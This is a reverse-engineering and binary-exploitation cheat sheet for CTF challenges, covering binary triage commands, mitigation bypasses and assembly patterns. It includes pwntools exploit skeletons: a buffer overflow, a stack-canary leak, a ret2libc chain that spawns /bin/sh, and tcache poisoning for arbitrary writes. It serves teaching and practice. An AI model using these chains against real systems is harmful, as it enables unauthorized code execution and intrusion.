RE Basics first contact with a binary

Reverse engineering is analyzing a compiled binary to understand its behavior without source. In CTFs the goal is usually a hidden flag; in the wild it's understanding what a piece of software actually does.

First steps with any binary

# 1. Identify the file type
file challenge

# 2. Check security mitigations
checksec --file=challenge

# 3. Extract readable strings
strings challenge
strings challenge | grep -i "flag\|ctf\|key\|pass"

# 4. Shared library dependencies
ldd challenge

# 5. ELF headers / symbols
readelf -h challenge
readelf -s challenge
readelf -d challenge          # dynamic section
objdump -T challenge          # dynamic symbol table

# 6. Raw bytes
xxd challenge | head -30
od -A x -t x1z challenge | head

Permissions & execution

chmod +x challenge
./challenge
file challenge          # confirm ELF 32/64-bit, stripped?, PIE?
nm challenge             # symbols, if not stripped

Binary Security Mitigations what checksec shows you

MitigationWhat it doesTypical bypass
NX / DEPStack is non-executableROP chains, ret2libc
Stack CanaryRandom value before saved return address; crashes on overwriteLeak the canary via format string or partial overwrite, then rewrite it unchanged
ASLRRandomizes stack/heap/library base addresses each runInfo leak, brute force on 32-bit, or partial overwrite of low bytes
PIERandomizes the binary's own base addressLeak a code pointer to compute the base
RELROMakes the GOT read-only after linkingPartial RELRO still allows GOT overwrite; Full RELRO blocks it
Run checksec --file=./binary first, every time. It tells you which exploitation techniques are even on the table before you write a line of exploit code.

x86 / x64 Assembly read it, don't write it

You rarely need to write assembly for RE — you need to recognize patterns: function calls, loops, conditionals, string comparisons.

Key registers (x64)

RegisterPurposex86 equiv
RAXReturn value from functionsEAX
RBPBase pointer (stack frame)EBP
RSPStack pointer (top of stack)ESP
RIPInstruction pointer (next instruction)EIP
RDI1st function argument(stack)
RSI2nd function argument(stack)
RDX3rd function argument(stack)
RCX4th argument / loop counter(stack)

Common instructions

; data movement
mov  rax, 5           ; rax = 5
push rax              ; push onto stack
pop  rbx              ; pop stack top into rbx
lea  rax, [rbp-0x8]   ; load effective address (pointer)

; arithmetic
add  rax, rbx
sub  rax, 1
xor  eax, eax         ; zero a register (common idiom)
imul rax, rbx

; comparison & jumps
cmp  rax, 0
je   label            ; jump if equal (ZF=1)
jne  label            ; jump if not equal
jg   label            ; jump if greater
jl   label            ; jump if less

; functions
call function          ; push return addr, jump
ret                    ; pop return address into RIP

Recognizing patterns

; if (strcmp(input, "secret") == 0)
lea  rdi, [rip+0x100]  ; rdi = input
lea  rsi, [rip+0x200]  ; rsi = "secret"
call strcmp
test eax, eax
je   success

; for (i = 0; i < 10; i++)
mov  ecx, 0
loop_start:
  cmp  ecx, 10
  jge  loop_end
  ; ... body ...
  add  ecx, 1
  jmp  loop_start
loop_end:

Buffer Overflow smashing the stack

Finding the offset

# pwntools cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt
gdb ./challenge
(gdb) run < pattern.txt
(gdb) x/wx $rsp
# crash value -> find offset

Basic exploit skeleton (pwntools)

from pwn import *

p = process('./challenge')          # or remote('host', port)
offset = 72
ret_addr = p64(0x deadbeef)          # target address, e.g. win() or system()

payload  = b'A' * offset
payload += ret_addr

p.sendline(payload)
p.interactive()

Leaking a stack canary

# canary is the first 8 bytes after your buffer, always ends in 0x00
payload = b'A' * offset            # fill exactly up to canary
p.sendafter(b'> ', payload)
leak = u64(p.recv(8).ljust(8, b'\x00')) 
canary = leak & ~0xff              # low byte is the null terminator

ROP Chains code reuse when NX is on

Finding gadgets

ROPgadget --binary challenge
ROPgadget --binary challenge --only "pop|ret"
ropper --file challenge --search "pop rdi"

# one-gadgets in libc (spawns a shell directly)
one_gadget libc.so.6

ret2libc chain (pwntools)

from pwn import *

elf  = ELF('./challenge')
libc = ELF('./libc.so.6')
p = process('./challenge')

pop_rdi = 0x0000000000401234        # from ROPgadget
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# stage 1: leak libc's puts address
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt) + p64(main)
p.sendline(payload)

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# stage 2: call system('/bin/sh')
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system)
p.sendline(payload)
p.interactive()
Same shape covers ret2plt, ret2csu (when you're short on gadgets), and SROP (pwn.SigreturnFrame) — only the gadgets and target function change.

Heap Exploitation glibc malloc internals

Inspecting the heap

gdb ./challenge
gef> heap chunks                 # list all chunks
gef> heap bins                    # tcache / fastbin / unsorted bin state
gef> heap chunk 0x603010          # inspect one chunk's metadata
pwndbg> vis                        # pwndbg's visual heap map

Classic bug classes

  • use-after-free — free a chunk, keep a dangling pointer, reuse it
  • double free — free the same chunk twice to corrupt the tcache/fastbin freelist
  • heap overflow — overflow one chunk's data into the next chunk's metadata
  • tcache poisoning — overwrite a freed chunk's fd pointer to make the next malloc() return an attacker-chosen address
# tcache poisoning skeleton (glibc 2.27+)
malloc(0x30) -> chunk A
free(A)                          # A now heads the tcache freelist
edit(A, p64(target_addr))        # overwrite A's fd pointer
malloc(0x30)                      # returns A again
malloc(0x30)                      # returns target_addr — write anywhere

Frida & angr instrumentation and symbolic execution

Frida — hook functions at runtime

frida-ps -U                                 # list processes (device)
frida -f ./challenge -l hook.js --no-pause  # spawn + attach with a script
// hook.js — intercept a function call
Interceptor.attach(Module.getExportByName(null, "strcmp"), {
  onEnter(args) {
    console.log("strcmp:", args[0].readCString(), args[1].readCString());
  }
});

angr — symbolic execution to solve constraints

python3 - <<'EOF'
import angr, claripy
proj = angr.Project('./challenge', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))
print(simgr.found[0].posix.dumps(0))   # the input that reaches "Correct"
EOF
